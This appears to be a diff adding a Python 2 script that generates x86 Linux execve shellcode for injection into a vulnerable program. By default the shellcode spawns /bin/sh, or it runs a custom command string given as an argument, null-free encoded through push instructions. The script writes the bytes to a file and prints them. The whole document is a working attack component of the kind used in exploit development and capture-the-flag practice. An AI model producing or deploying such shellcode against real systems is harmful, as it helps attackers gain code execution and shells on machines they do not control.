@@ -1,0 +1,55 @@
+#!/usr/bin/python2
+
+import os
+import sys
+
+# take a string and convert it to hex similar to how
+# shellcode is injected into a program. Returns the
+# converted string
+def asciiToHex(str):
+    returnStr = ""
+
+    # check if the string is a multiple of 4 char long
+    # so we can padding to the string and avoid null bytes
+    if(len(str) % 4 == 0):
+        n = 8
+        hStr = str.encode("hex")
+        hexStr = [hStr[i:i+n] for i in range(0, len(hStr), n)]
+
+        for i in range(len(hexStr) - 1, -1, -1):
+            returnStr = returnStr + "\\x68"
+            for j in range(0, len(hexStr[i]) , 2):
+
+                returnStr = returnStr + "\\x" + hexStr[i][j] + hexStr[i][j+1]
+    else:
+        passString = "/" * (4 - len(str) % 4) + str
+        return asciiToHex(passString)
+
+    return returnStr
+
+# if no arguments are provided, the default is bin/sh
+# Otherwise, make shellcode out of a custom string
+if(len(sys.argv) == 1):
+    shellcode = "\\x31\\xc0\\x50" + \
+                asciiToHex('bin/sh') + \
+                "\\x89\\xe3\\x50\\x53" + \
+                "\\x89\\xe1\\x89\\xc2" + \
+                "\\xb0\\x0b\\xcd\\x80" + \
+                "\\x31\\xc0\\xb0\\x01" + \
+                "\\x31\\xdb\\xcd\\x80" + \
+                "\\x66\\x90\\x90"
+else:
+    shellcode = "\\x31\\xc0\\x50" + \
+                asciiToHex(sys.argv[1]) + \
+                "\\x89\\xe3\\x50\\x53" + \
+                "\\x89\\xe1\\x89\\xc2" + \
+                "\\xb0\\x0b\\xcd\\x80" + \
+                "\\x31\\xc0\\xb0\\x01" + \
+                "\\x31\\xdb\\xcd\\x80" + \
+                "\\x66\\x90\\x90"
+
+target = open('shellcode', 'w')
+target.truncate()
+target.write(shellcode)
+
+print "Here is the shellcode to inject: " + shellcode + "\nand it is ", len(shellcode), " characters long and ", len(shellcode) / 4, " bytes long"
